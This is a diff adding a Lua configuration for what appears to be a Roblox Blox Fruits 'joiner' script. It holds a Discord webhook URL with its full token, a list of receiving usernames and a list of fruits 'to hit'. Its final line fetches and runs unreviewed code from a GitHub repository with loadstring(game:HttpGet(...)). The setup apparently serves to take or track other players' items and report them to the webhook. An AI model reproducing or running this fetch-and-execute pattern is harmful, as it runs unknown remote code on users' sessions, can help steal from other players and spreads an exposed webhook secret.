@@ -1,0 +1,5 @@
+Webhook = "https://discord.com/api/webhooks/1358493190789009610/E9AJ4LNhBJO3XcZwpifMSwtzIo7YRE_RCEwo-HaerpW77ZbnwkSATstaR2B2rZqa-2RC" -- << Your Webhook
+Usernames = {"moussa12209", "Mike3w4", "karim_f11", "user4", "user5"} -- << Your usernames here, you can add as many alts as you want
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want the script to detect
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SharkyScriptz/Joiner/refs/heads/main/V3"))()
